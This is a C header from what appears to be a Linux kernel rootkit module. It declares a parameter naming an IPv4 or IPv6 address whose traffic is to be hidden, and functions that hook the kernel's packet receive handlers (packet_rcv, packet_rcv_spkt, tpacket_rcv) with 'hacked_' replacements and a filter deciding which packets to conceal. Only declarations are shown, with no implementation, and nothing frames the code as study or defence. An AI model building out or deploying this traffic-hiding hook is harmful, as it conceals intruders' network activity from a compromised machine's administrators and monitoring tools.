#ifndef HIDEPACKET_H
#define HIDEPACKET_H

#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <net/ip.h>
#include <linux/inet.h>
#include <linux/in6.h>
#include "include.h"
#include "sysmap.h"


extern unsigned int hideThisIP;
extern struct in6_addr hideThisIP6;
extern char* hideThisIPString;
module_param(hideThisIPString, charp, 0000);
MODULE_PARM_DESC(hideThisIPString, "IP address packages to and from should be hidden. Can be either IPv4 or IPv6");


// function prototypes

void hook_pac_rcv(void);
void hook_pac_rcv_spkt(void);
void hook_tpac_rcv(void);

void unhook_pac_rcv(void);
void unhook_pac_rcv_spkt(void);
void unhook_tpac_rcv(void);


void parseIP(char* strIP);
bool needToHide(struct sk_buff* buff);
int hacked_packet_rcv (struct sk_buff* buff, struct net_device* sdev, struct packet_type* packtype, struct net_device* ddev);
int hacked_packet_rcv_spkt (struct sk_buff* buff, struct net_device* sdev, struct packet_type* packtype, struct net_device* ddev);
int hacked_tpacket_rcv (struct sk_buff* buff, struct net_device* sdev, struct packet_type* packtype, struct net_device* ddev);
int init_hide_packet(void);
void exit_hide_packet(void);

#endif
